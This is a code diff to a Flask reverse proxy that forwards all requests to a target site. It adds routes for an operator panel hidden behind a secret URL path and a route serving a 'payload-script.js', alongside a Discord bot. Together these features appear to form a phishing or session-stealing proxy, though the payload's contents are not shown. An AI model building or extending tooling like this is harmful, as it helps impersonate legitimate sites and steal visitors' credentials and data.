@@ -49,12 +49,32 @@ initialize_discord_bot()
 def start_proxy(target, host, port, secret):
     app = Flask(__name__, static_folder='panel', static_url_path='')
 
+    # Serve panel files
+    @app.route(f'/{secret}')
+    def panel_index():
+        return send_from_directory('panel', 'index.html')
+
+    @app.route(f'/{secret}/<path:filename>')
+    def panel_files(filename):
+        return send_from_directory('panel', filename)
+
+    # Serve payload script
+    @app.route('/payload-script.js')
+    def serve_payload():
+        return send_from_directory('.', 'payload-script.js')
+
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
     def proxy(path):
-        if path.startswith(secret):
-            return panel_index()
+        # Check if it's a panel request first
+        if secret in path:
+            if path == secret:
+                return panel_index()
+            elif path.startswith(f"{secret}/"):
+                filename = path[len(f"{secret}/"):]
+                return panel_files(filename)
 
+        # Regular proxy handling
         target_url = f"https://{target}/{path}"
         
         # Handle OPTIONS for CORS
